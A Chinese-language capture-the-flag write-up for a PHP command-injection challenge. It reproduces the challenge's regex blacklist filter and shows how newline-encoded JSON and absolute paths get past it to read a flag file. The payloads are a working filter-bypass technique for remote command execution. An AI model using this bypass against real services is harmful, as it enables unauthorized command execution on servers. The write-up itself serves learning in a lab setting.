![[Pasted image 20221224090401.png|500]]

---
首页长这样
![[Pasted image 20221224090929.png|400]]

要我们输入一个`json`字符串，通过`cmd`查询传递，因而推测键名也为`cmd`
```json
{"cmd": "ls"}
```

> Attempting to run command:  
index.php

尝试获取`index.php`的内容

```json
{"cmd": "cat index.php"}
```

> Hacking attempt detected

多次尝试无果，寻求`wp`帮助QAQ
然后发现原题离谱地提供了源码
![[Pasted image 20221224093015.png]]

```php
<?php

putenv('PATH=/home/rceservice/jail');

if (isset($_REQUEST['cmd'])) {
  $json = $_REQUEST['cmd'];

  if (!is_string($json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } else {
    echo 'Attempting to run command:<br/>';
    $cmd = json_decode($json, true)['cmd'];
    if ($cmd !== NULL) {
      system($cmd);
    } else {
      echo 'Invalid input';
    }
    echo '<br/><br/>';
  }
}
?>
```

通过`preg_match`实现`WAF`，直接通过`%0a`绕过单行匹配中的`.*`

```
{%0a"cmd": "cat index.php"%0a}
```

> Attempting to run command:

没有回显，非常奇怪nanoda

```php
putenv('PATH=/home/rceservice/jail');
```
![[Pasted image 20221224094442.png|500]]

emmm，这波是`PATH`被挟持了，问题不大，用绝对路径应该就行
尝试查看`/home/rceservice/jail`下面的东西
```
{%0a"cmd": "ls /home/rceservice/jail"%0a}
```

> Attempting to run command:
ls

好家伙，真就只给了`ls`
```
{%0a"cmd": "ls /home/rceservice"%0a}
```

> Attempting to run command:  
flag jail

```
{%0a"cmd": "/bin/cat /home/rceservice/flag"%0a}
```

> Attempting to run command:  
flag{f632fadd-2fad-439f-b5e1-75acf38cc1f3}

#Web #RCE #PHP #正则表达式 #json #环境变量 #挟持